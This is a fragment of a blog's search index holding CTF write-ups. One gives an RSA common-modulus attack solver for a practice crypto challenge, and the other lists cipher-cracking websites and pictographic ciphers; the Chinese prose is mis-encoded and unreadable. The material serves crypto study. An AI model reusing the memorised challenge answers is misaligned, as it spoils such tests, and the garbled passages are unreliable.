class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> powmod<br><br>p = getPrime(<span class="hljs-number">2048</span>)<br>q = getPrime(<span class="hljs-number">2048</span>)<br>N = p*q<br>Phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_enc_key</span>(<span class="hljs-params">N,Phi</span>):<br>    e = getPrime(N)<br>    <span class="hljs-keyword">if</span> Phi % e == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> get_enc_key(N, Phi)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> e<br>e1 = get_enc_key(randint(<span class="hljs-number">10</span>, <span class="hljs-number">12</span>), Phi)<br>e2 = get_enc_key(randint(<span class="hljs-number">10</span>, <span class="hljs-number">12</span>), Phi)<br><br>fr = <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;./base64&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>)<span class="hljs-comment">#flag is in this file</span><br>f1 = <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;./HUB1&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>)<br>f2 = <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;./HUB2&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>)<br>base64 = fr.read(<span class="hljs-number">255</span>)<br>f1.write(<span class="hljs-string">&quot;%d\n%d\n&quot;</span> % (N, e1))<br>f2.write(<span class="hljs-string">&quot;%d\n%d\n&quot;</span> % (N, e2))<br><span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(base64)&gt;<span class="hljs-number">0</span>:<br>    pt = bytes_to_long(base64)<br>    ct1 = powmod(pt, e1, N)<br>    ct2 = powmod(pt, e2, N)<br>    f1.write(<span class="hljs-string">&quot;\n%d&quot;</span> % ct1)<br>    f2.write(<span class="hljs-string">&quot;\n%d&quot;</span> % ct2)<br>    base64 = fr.read(<span class="hljs-number">255</span>)<br>fr.close()<br>f1.close()<br>f2.close()<br></code></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾è¿™é‡Œç”¨äº†ç›¸åŒçš„æ¨¡æ•°Nå’Œä¸¤ä¸ªå…¬é’¥ï¼ŒåŠ å¯†å¾—å‡ºäº†å¤šä¸ªå¯†æ–‡ï¼Œéƒ½å­˜æ”¾åœ¨HUB1å’ŒHUB2ä¸­ï¼Œè€ƒè™‘å…±æ¨¡æ”»å‡»ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> powmod<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> primefac<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">same_n_attack</span>(<span class="hljs-params">n,e1,e2,c1,c2</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">egcd</span>(<span class="hljs-params">a,b</span>):<br>         x, lastX = <span class="hljs-number">0</span>, <span class="hljs-number">1</span><br>         y, lastY = <span class="hljs-number">1</span>, <span class="hljs-number">0</span><br>         <span class="hljs-keyword">while</span> (b != <span class="hljs-number">0</span>):<br>             q = a // b<br>             a, b = b, a % b<br>             x, lastX = lastX - q * x, x<br>             y, lastY = lastY - q * y, y<br>         <span class="hljs-keyword">return</span> (lastX, lastY)<br>    s = egcd(e1,e2)<br>    s1 = s[<span class="hljs-number">0</span>]<br>    s2 = s[<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">if</span> s1 &lt; <span class="hljs-number">0</span>:<br>        s1 = -s1<br>        c1 = primefac.modinv(c1, n)<br>        <span class="hljs-keyword">if</span> c1 &lt; <span class="hljs-number">0</span>:<br>            c1 += n<br>    <span class="hljs-keyword">elif</span> s2 &lt; <span class="hljs-number">0</span>:<br>        s2 = -s2<br>        c2 = primefac.modinv(c2, n)<br>        <span class="hljs-keyword">if</span> c2 &lt; <span class="hljs-number">0</span>:<br>            c2 += n<br>    m = (<span class="hljs-built_in">pow</span>(c1, s1, n) * <span class="hljs-built_in">pow</span>(c2, s2, n)) % n<br>    <span class="hljs-keyword">return</span> m<br><br><span class="hljs-keyword">import</span> gmpy2<br>f1 = <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;./HUB1&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).readlines()<br>f2 = <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;./HUB2&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).readlines()<br>n=<span class="hljs-built_in">int</span>(f1[<span class="hljs-number">0</span>])<br>e1=<span class="hljs-built_in">int</span>(f1[<span class="hljs-number">1</span>])<br>e2=<span class="hljs-built_in">int</span>(f2[<span class="hljs-number">1</span>])<br><span class="hljs-built_in">print</span>(e1,e2)<br>c=<span class="hljs-string">&#x27;&#x27;</span><br>gcd, s, t = gmpy2.gcdext(e1, e2)<br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>,<span class="hljs-built_in">len</span>(f2)):<br>    message1 = <span class="hljs-built_in">int</span>(f1[i])<br>    message2 = <span class="hljs-built_in">int</span>(f2[i])<br>    plain = same_n_attack(n,e1,e2,message1,message2)<br>    c=long_to_bytes(plain)<br>    flag+=<span class="hljs-built_in">str</span>(c)<br><span class="hljs-built_in">print</span>()<br>flag = flag[<span class="hljs-number">2</span>:-<span class="hljs-number">2</span>].split(<span class="hljs-string">&#x27;\\n&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag:<br>    <span class="hljs-built_in">print</span>(base64.b64decode(i).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>),end=<span class="hljs-string">&#x27; &#x27;</span>)<br></code></pre></td></tr></table></figure><p>å¾—åˆ°ä¸€ä¸²å­—ç¬¦ä¸²</p><p><img src="buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/RSA&amp;What_2.png" alt="2"></p><p>åŒæ—¶ä¼šæŠ¥é”™</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/RSA&amp;What_2.png" alt="RSA&amp;What_2"></p><p>ä¸€å¼€å§‹ä¸çŸ¥é“ä¸ºä»€ä¹ˆæŠ¥é”™ã€‚è¾“å‡ºä¸€ä¸‹æŠ¥é”™çš„é‚£æ®µå¯†æ–‡è½¬æ¢è¿‡æ¥çš„å€¼</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/RSA&amp;What_4.png" alt="RSA&amp;What_4"></p><p>è¿™é‡Œå¡äº†å¾ˆä¹…ï¼Œè¿˜ä»¥ä¸ºé¢˜ç›®å‡ºé—®é¢˜äº†ã€‚ä¹‹åä¸Šç½‘æœç´¢æ‰å‘ç°æ˜¯å› ä¸ºè¿™é“é¢˜å°±æ˜¯è¿™æ ·å‡ºçš„ï¼Œå®ƒç”¨äº†base64éšå†™ï¼Œ<a href="https://.com.cn">base64</a>çš„éšå†™å‘åœ¨è¿™é‡Œäº†ã€‚</p><p>ç›´æ¥ç”¨è„šæœ¬å°±å¯ä»¥ï¼Œæœ€åå¾—åˆ°7c86d8f7d6de33a87f7f9d6b005ce640ï¼ŒåŒ…ä¸Šflag{}æäº¤</p>]]></content>
    
    
    
    <tags>
      
      <tag>åˆ·é¢˜è®°å½•</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä¸€äº›åšé¢˜ç»éªŒ</title>
    <link href="/2023/05/07/%E4%B8%80%E4%BA%9B%E5%81%9A%E9%A2%98%E7%BB%8F%E9%AA%8C/"/>
    <url>/2023/05/07/%E4%B8%80%E4%BA%9B%E5%81%9A%E9%A2%98%E7%BB%8F%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="md5ç½‘ç«™">md5ç½‘ç«™</h1><p><a href="https://www.cmd5.com/">https://www.cmd5.com/</a></p><h1 id="æ›¿æ¢å¯†ç çˆ†ç ´">æ›¿æ¢å¯†ç çˆ†ç ´</h1><p><a href="https://quipqiup.com/">https://quipqiup.com/</a></p><h1 id="Rsaå¤§ç´ å› æ•°åˆ†è§£">Rsaå¤§ç´ å› æ•°åˆ†è§£</h1><p><a href="http://www.factordb.com/">http://www.factordb.com/</a></p><h1 id="ä¸ä½›è®ºç¦…">ä¸ä½›è®ºç¦…</h1><p>ä¸¤ç§ä¸åŒçš„åŠ å¯†æ–¹å¼ï¼Œä½†æ˜¯æœ€åéƒ½å¾—åˆ°ä¸€ä¸²ä½›æ–‡ï¼Œé‡åˆ°äº†æœ€å¥½ä¸¤ä¸ªç½‘ç«™éƒ½è¯•ä¸€è¯•</p><ul><li>æ—§ä¸ä½›è®ºç¦…<a href="https://www.keyfc.net/bbs/tools/tudoucode.aspx">https://www.keyfc.net/bbs/tools/tudoucode.aspx</a></li><li>æ–°çº¦ä½›è®ºç¦…<a href="http://hi.pcmoe.net/Buddha.html">http://hi.pcmoe.net/Buddha.html</a></li></ul><h1 id="ç»´å‰å°¼äºšçˆ†ç ´ï¼ˆå·²æ— æ³•ä½¿ç”¨ï¼‰">ç»´å‰å°¼äºšçˆ†ç ´ï¼ˆå·²æ— æ³•ä½¿ç”¨ï¼‰</h1><p><a href="https://www.guballa.de/vigenere-solver">https://www.guballa.de/vigenere-solver</a></p><h1 id="RSAçš„pemæ ¼å¼è½¬æ¢ï¼ˆpythonå®ç°ï¼‰">RSAçš„pemæ ¼å¼è½¬æ¢ï¼ˆpythonå®ç°ï¼‰</h1><p>pemè½¬æ­£å¸¸æ ¼å¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> Crypto.PublicKey.RSA<br>n=<span class="hljs-number">0</span><br>e=<span class="hljs-number">0</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&#x27;C:\Users\yz\Desktop\é¢˜ç›®\ISCC\misc\guss_rsa\publickey.pem&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    key = Crypto.PublicKey.RSA.importKey(f.read())<br>    n = key.n<br>    e = key.e<br></code></pre></td></tr></table></figure><h2 id="taræ–‡ä»¶">taræ–‡ä»¶</h2><p>é‡åˆ°taræ–‡ä»¶å¯ä»¥ç›´æ¥è¿›å…¥cmdçª—å£ï¼Œè¾“å…¥</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-meta">#é¦–å…ˆåˆ‡æ¢åˆ°ä½ æƒ³è¦æŠŠå®ƒè§£å‹çš„åœ°æ–¹ï¼Œä¾‹å¦‚æˆ‘æƒ³è§£å‹åˆ°dç›˜ï¼š</span><br><span class="hljs-meta">#ç›´æ¥åœ¨cmdä¸­è¾“å…¥ï¼š</span><br><span class="hljs-symbol">d:</span><span class="hljs-meta">#å›è½¦</span><br>tar -xvf filename<span class="hljs-meta">#ç›´æ¥å¤åˆ¶è¿‡æ¥å°±å¥½äº†</span><br></code></pre></td></tr></table></figure><h1 id="å¥‡å¥‡æ€ªæ€ªçš„å¯†ç ">å¥‡å¥‡æ€ªæ€ªçš„å¯†ç </h1><p>åšå¯†ç é¢˜æˆ–è€…æ‚é¡¹é¢˜è€æ˜¯é‡åˆ°ä¸€äº›å¥‡å¥‡æ€ªæ€ªçš„å¯†ç ï¼Œè®°å½•ä¸€ä¸‹ç§¯ç´¯çš„å¯†ç </p><h1 id="å›¾å½¢å¯†ç ">å›¾å½¢å¯†ç </h1><h2 id="çŒªåœˆå¯†ç ">çŒªåœˆå¯†ç </h2><p>è¿™ä¸ªå¾ˆå¸¸è§ï¼Œç›´æ¥è´´å›¾</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E7%8C%AA%E5%9C%88%E5%AF%86%E7%A0%81.jpg" alt="çŒªåœˆå¯†ç "></p><h2 id="åœ£å ‚æ­¦å£«å¯†ç -çŒªåœˆå˜å½¢1">åœ£å ‚æ­¦å£«å¯†ç -çŒªåœˆå˜å½¢1</h2><p>çŒªåœˆå¯†ç çš„å˜å½¢</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E5%9C%A3%E5%A0%82.jpg" alt="åœ£å ‚"></p><h2 id="é“¶æ²³å¯†ç ">é“¶æ²³å¯†ç </h2><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E9%93%B6%E6%B2%B3.jpg" alt="é“¶æ²³"></p><h2 id="ç¦å°”æ‘©æ–¯â€“è·³èˆçš„å°äºº">ç¦å°”æ‘©æ–¯â€“è·³èˆçš„å°äºº</h2><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E8%B7%B3%E8%88%9E.jpg" alt="è·³èˆ"></p><h2 id="ç²¾çµè¯­">ç²¾çµè¯­</h2><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E7%B2%BE%E7%81%B5%E8%AF%AD.png" alt="ç²¾çµè¯­"></p><h1 id="çŒªåœˆå˜å½¢2">çŒªåœˆå˜å½¢2</h1><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E7%8C%AA%E5%9C%882.png" alt="çŒªåœˆ2"></p><h1 id="çŒªåœˆå˜å½¢3">çŒªåœˆå˜å½¢3</h1><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E7%8C%AA%E5%9C%883.png" alt="çŒªåœˆ3"></p><h1 id="å¤å¤šå¯†ç ">å¤å¤šå¯†ç </h1><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E5%A4%8F%E5%A4%9A.png" alt="å¤å¤š"></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
